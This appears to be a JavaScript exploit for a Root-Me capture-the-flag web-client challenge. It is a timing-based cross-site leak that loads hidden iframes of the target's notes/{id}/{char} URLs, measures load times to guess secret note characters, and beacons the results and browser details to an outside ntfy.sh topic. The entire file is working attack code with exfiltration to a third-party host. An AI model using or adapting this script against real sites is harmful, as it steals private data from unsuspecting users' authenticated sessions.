const B='https://web-client-ch56.challenge01.root-me.org:58056/';
const N='https://ntfy.sh/wcxleak56a';
const RID=Date.now()%100000;
const T0=Date.now(),EL=()=>Date.now()-T0;
const beacon=s=>{try{navigator.sendBeacon(N,s)}catch(e){}};
const logj=o=>beacon(JSON.stringify(Object.assign({r:RID,t:Math.round(EL()*10)/10},o)));
onunhandledrejection=e=>{try{beacon(JSON.stringify({r:RID,t:Math.round(EL()*10)/10,er:(''+(e.reason&&e.reason.stack||e.reason)).slice(0,180)}))}catch(_){}}
const CHARS='abcdefghijklmnopqrstuvwxyz0123456789-_ ';
const C1=CHARS.slice(0,19).split(''),C2=CHARS.slice(19).split('');
let seq=0,dead=0;
addEventListener('pagehide',()=>logj({ev:'ph'}));
setInterval(()=>{if(!dead)logj({ev:'hb'})},2000);setTimeout(()=>dead=1,24000);
function probe(id,q){return new Promise(res=>{const f=document.createElement('iframe');const st=Date.now();let fin=0;
 const done=v=>{if(!fin){fin=1;try{f.remove()}catch(e){}res(v)}};
 f.style.cssText='display:none;width:0;height:0';
 f.onload=()=>{const d=Date.now()-st;if(d>1500&&d<6000)logj({ev:'h',i:id,c:q,d:d});done(d)};
 f.onerror=()=>done(9999);
 setTimeout(()=>done(9998),3500);
 const myseq=seq++;
 setTimeout(()=>{if(!fin)document.body.appendChild(f)},14*(myseq%34));
 f.src=B+'notes/'+id+'/'+encodeURIComponent(q)+'?v='+RID+'x'+(myseq);});}
function wave(id,chars,tickw){ // ONE id, <=20 chars, <=20 iframes
 const t0=Date.now();let dn=0;const n=chars.length;let tk=0;
 const ps=chars.map(c=>probe(id,c).then(d=>{dn++;
  if((dn===n||Date.now()-t0>1400)&&!tk){tk=1;logj({ev:'tk',w:tickw,id:id,dn:dn,n:n})}}));
 return Promise.all(ps);}
(async()=>{
 const H=new Map(location.hash.slice(1).split('&').map(s=>[s.split('=')[0]||'',s.split('=')[1]||'']));
 let ids=(H.get('k')||'1,2,3,4,5,6,7,8').split(',').map(x=>parseInt(x)).filter(x=>x>0);
 const conn=navigator.connection||{};
 logj({ev:'start',ua:navigator.userAgent.slice(0,55),ck:navigator.cookieEnabled?1:0,hc:navigator.hardwareConcurrency,et:conn.effectiveType||'-',rt:conn.rtt!=-1?conn.rtt:-1,ids:ids.join(',')});
 const m0=Date.now();
 await new Promise(res=>{const f=document.createElement('iframe');f.style.cssText='display:none';
  f.onload=()=>{logj({ev:'mk',t:Date.now()-m0});res()};f.onerror=()=>{logj({ev:'mk',err:1});res()};setTimeout(res,4500);f.src=B+'?m='+RID;document.body.appendChild(f);});
 for(let i=0;i<ids.length&&EL()<20000;i++){
  const id=ids[i];
  await wave(id,C1,i);if(EL()>20000){logj({ev:'cut',i:i});break;}
  await wave(id,C2,i);logj({ev:'iddone',i:i,id:id});
 }
 logj({ev:'done'});
})();
